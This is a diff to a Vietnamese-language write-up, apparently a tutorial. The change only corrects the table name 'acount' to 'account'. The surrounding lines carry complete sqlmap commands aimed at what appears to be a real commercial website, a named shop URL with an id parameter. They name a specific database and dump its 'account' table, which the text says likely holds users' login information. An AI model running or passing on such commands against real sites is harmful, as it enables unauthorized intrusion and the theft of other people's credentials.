@@ -37,7 +37,7 @@ Sử dụng `python3 sqlmap.py -u "https://2fly.com.vn/shop.php?id=12" -D fly113
 
 ![alt text](images/8.png)
 
-Có thể thấy trong các tên được trả về có bảng `acount`, trong đó có thể sẽ chứa thông tin đăng nhập của một số người dùng. Tiếp tục sử dụng `python3 sqlmap.py -u "https://2fly.com.vn/shop.php?id=12" -D fly11308_2fly -T account --dump --threads=10` để trả về nội dung của bảng `account`.
+Có thể thấy trong các tên được trả về có bảng `account`, trong đó có thể sẽ chứa thông tin đăng nhập của một số người dùng. Tiếp tục sử dụng `python3 sqlmap.py -u "https://2fly.com.vn/shop.php?id=12" -D fly11308_2fly -T account --dump --threads=10` để trả về nội dung của bảng `account`.
 
 ![alt text](images/9.png)
 
